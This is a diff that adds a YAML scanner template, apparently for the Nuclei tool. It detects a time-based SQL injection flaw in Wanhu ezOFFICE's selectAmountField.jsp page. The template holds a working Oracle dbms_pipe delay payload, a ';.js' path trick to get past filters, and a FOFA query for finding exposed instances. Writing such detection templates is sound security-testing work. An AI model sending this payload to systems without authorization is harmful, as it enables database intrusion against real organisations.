@@ -1,0 +1,35 @@
+id: poc-yaml-wanhu-ezoffice-selectamountfield-sqli
+info:
+  name: 万户 ezOFFICE selectAmountField SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 万户OA ezoffice
+    fofa-query: app="万户网络-ezOFFICE"
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/platform/custom/custom_database/dropdownselect/selectAmountField.jsp;.js?tableId=1+and+1=dbms_pipe.receive_message(%27RDS%27,{{t1}})--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "class=\"selectlist\""
+      - type: word
+        part: header
+        words:
+          - "Path=/defaultroot"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
